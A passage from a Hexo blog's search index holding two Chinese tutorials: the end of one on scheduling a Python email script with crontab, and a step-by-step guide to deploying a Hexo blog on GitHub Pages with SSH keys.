alt="3.png"><br>直接拖进去就行</p><h3 id="这里注意保证你的服务器上的python版本和你本机一致，且需要的包已经安装"><a href="#这里注意保证你的服务器上的python版本和你本机一致，且需要的包已经安装" class="headerlink" title="这里注意保证你的服务器上的python版本和你本机一致，且需要的包已经安装"></a>这里注意保证你的服务器上的python版本和你本机一致，且需要的包已经安装</h3><ul><li>如果你的服务器上的版本是2.*的可以运行下面代码安装python3<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove python</span><br><span class="line">sudo apt-get install python3</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure></li></ul><h3 id="用xshell进入服务器试着运行"><a href="#用xshell进入服务器试着运行" class="headerlink" title="用xshell进入服务器试着运行"></a>用xshell进入服务器试着运行</h3><p><img src="https://i.loli.net/2018/11/17/5befc966d6b17.png" alt="TIM图片20181117155505.png"></p><h2 id="在服务器端设置定时执行"><a href="#在服务器端设置定时执行" class="headerlink" title="在服务器端设置定时执行"></a>在服务器端设置定时执行</h2><h3 id="确保你安装了crontab（ubuntu默认安装）"><a href="#确保你安装了crontab（ubuntu默认安装）" class="headerlink" title="确保你安装了crontab（ubuntu默认安装）"></a>确保你安装了crontab（ubuntu默认安装）</h3><p>cron命名解析：执行的时间 + 执行的用户 + 执行的命令<br><img src="https://i.loli.net/2018/11/17/5befc8af89fb3.png" alt="4.png"></p><h3 id="查看原有的cron"><a href="#查看原有的cron" class="headerlink" title="查看原有的cron"></a>查看原有的cron</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/17/5befc9f6040d2.png" alt="TIM图片20181117155728.png"></p><h3 id="编辑你的程序"><a href="#编辑你的程序" class="headerlink" title="编辑你的程序"></a>编辑你的程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/crontab</span><br></pre></td></tr></table></figure><p>编写你的命令，每天14:58给我发送邮件，这里根据你看的小说的更新时间设置，一天几更在大约什么时间等等<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58 14 * * * root python3 smtp.py</span><br></pre></td></tr></table></figure></p><p>编辑好了再次查看cron是否已经写入，我这里已经写入<br><img src="https://i.loli.net/2018/11/17/5befcb198cbae.png" alt="TIM图片20181117160221.png"><br>重启crontab服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service cron restart</span><br></pre></td></tr></table></figure></p><h2 id="静静的等待14-58的到来，查看邮箱"><a href="#静静的等待14-58的到来，查看邮箱" class="headerlink" title="静静的等待14:58的到来，查看邮箱"></a>静静的等待14:58的到来，查看邮箱</h2><ul><li>邮件收到了最新更新的哦<br><img src="https://i.loli.net/2018/11/17/5befcbd7281ec.png" alt="TIM图片20181117160515.png"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>github+hexo搭建个人博客</title>
      <link href="/2018/11/11/github-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/11/11/github-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="1-创建的项目名默认为-用户名-github-io-创建时点击生成readme文件，方便后面添加说明"><a href="#1-创建的项目名默认为-用户名-github-io-创建时点击生成readme文件，方便后面添加说明" class="headerlink" title="1.创建的项目名默认为  用户名.github.io,创建时点击生成readme文件，方便后面添加说明"></a>1.创建的项目名默认为  <strong>用户名.github.io</strong>,创建时点击生成readme文件，方便后面添加说明</h3><p><img aligen="center" src="https://i.loli.net/2018/11/13/5beaa5e07e5a7.png"></p><h3 id="2-在本地创建一个文件夹，我是在E盘创建的blog，推荐用vscode作为编辑器，在编辑器里面打开文件夹，打开Terminer"><a href="#2-在本地创建一个文件夹，我是在E盘创建的blog，推荐用vscode作为编辑器，在编辑器里面打开文件夹，打开Terminer" class="headerlink" title="2.在本地创建一个文件夹，我是在E盘创建的blog，推荐用vscode作为编辑器，在编辑器里面打开文件夹，打开Terminer"></a>2.在本地创建一个文件夹，我是在E盘创建的blog，推荐用vscode作为编辑器，在编辑器里面打开文件夹，打开Terminer</h3><p><img src="https://i.loli.net/2018/11/13/5beaacf147c83.png" alt="使用vscode打开文件夹"></p><h3 id="3-使用hexo初始化文件夹，这一步会产生很多的hexo配置文件，我们先不管，先跑起来"><a href="#3-使用hexo初始化文件夹，这一步会产生很多的hexo配置文件，我们先不管，先跑起来" class="headerlink" title="3.使用hexo初始化文件夹，这一步会产生很多的hexo配置文件，我们先不管，先跑起来"></a>3.使用hexo初始化文件夹，这一步会产生很多的hexo配置文件，我们先不管，先跑起来</h3><p><img src="https://i.loli.net/2018/11/13/5beaae3c7ee9d.png" alt="hexo初始化文件夹"></p><h3 id="4-运行hexo-server打开服务，看看本地能不能显示"><a href="#4-运行hexo-server打开服务，看看本地能不能显示" class="headerlink" title="4.运行hexo server打开服务，看看本地能不能显示"></a>4.运行hexo server打开服务，看看本地能不能显示</h3><p><img src="https://i.loli.net/2018/11/13/5beab03a63524.png" alt="hexo server"><br>运行后访问url，如果看到如图就成功了<br><img src="https://i.loli.net/2018/11/13/5beab09f5e2ab.jpg" alt="运行效果"></p><h3 id="5-配置文件中填写git的配置信息，按照如下格式填写"><a href="#5-配置文件中填写git的配置信息，按照如下格式填写" class="headerlink" title="5.配置文件中填写git的配置信息，按照如下格式填写"></a>5.配置文件中填写git的配置信息，按照如下格式填写</h3><p><img src="https://i.loli.net/2018/11/13/5beab1fb7f83a.png" alt="配置信息"></p><h3 id="6-打开文件夹，右键git-bash-here"><a href="#6-打开文件夹，右键git-bash-here" class="headerlink" title="6.打开文件夹，右键git bash here"></a>6.打开文件夹，右键git bash here</h3><p><img src="https://i.loli.net/2018/11/13/5beab3362770b.png" alt="git bash here"></p><h3 id="7-输入cd-ssh，进入ssh文件夹"><a href="#7-输入cd-ssh，进入ssh文件夹" class="headerlink" title="7.输入cd ~/.ssh，进入ssh文件夹"></a>7.输入cd ~/.ssh，进入ssh文件夹</h3><p><img src="https://i.loli.net/2018/11/13/5beab3e76e0c4.png" alt="ssh"></p><h3 id="8-配置git中的用户名和邮箱"><a href="#8-配置git中的用户名和邮箱" class="headerlink" title="8.配置git中的用户名和邮箱"></a>8.配置git中的用户名和邮箱</h3><p><img src="https://i.loli.net/2018/11/13/5beab93273357.png" alt="配置用户名"></p><h3 id="9-生成ssh密钥"><a href="#9-生成ssh密钥" class="headerlink" title="9.生成ssh密钥"></a>9.生成ssh密钥</h3><p><img src="https://i.loli.net/2018/11/13/5beab95f2f069.png" alt="生成密钥"></p><h3 id="10-在github的项目中加入密钥"><a href="#10-在github的项目中加入密钥" class="headerlink" title="10.在github的项目中加入密钥"></a>10.在github的项目中加入密钥</h3><p><img src="https://i.loli.net/2018/11/13/5beab988e1bda.png" alt="添加密钥"></p><h3 id="11-测试密钥链接是否成功"><a href="#11-测试密钥链接是否成功" class="headerlink" title="11.测试密钥链接是否成功"></a>11.测试密钥链接是否成功</h3><p><img src="https://i.loli.net/2018/11/13/5beab9fc045d7.png" alt="测试"></p><h3 id="12-测试成功后再再编辑器中运行"><a href="#12-测试成功后再再编辑器中运行" class="headerlink" title="12.测试成功后再再编辑器中运行"></a>12.测试成功后再再编辑器中运行</h3><pre><code>hexo cleanhexo ghexo d</code></pre><p><img src="https://i.loli.net/2018/11/13/5beaba9fb29d7.png" alt="4.png">这样就算上传成功</p><h3 id="13-访问你的博客，看到之前再本地运行的界面，就行了"><a href="#13-访问你的博客，看到之前再本地运行的界面，就行了" class="headerlink" title="13.访问你的博客，看到之前再本地运行的界面，就行了"></a>13.访问你的博客，看到之前再本地运行的界面，就行了</h3>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
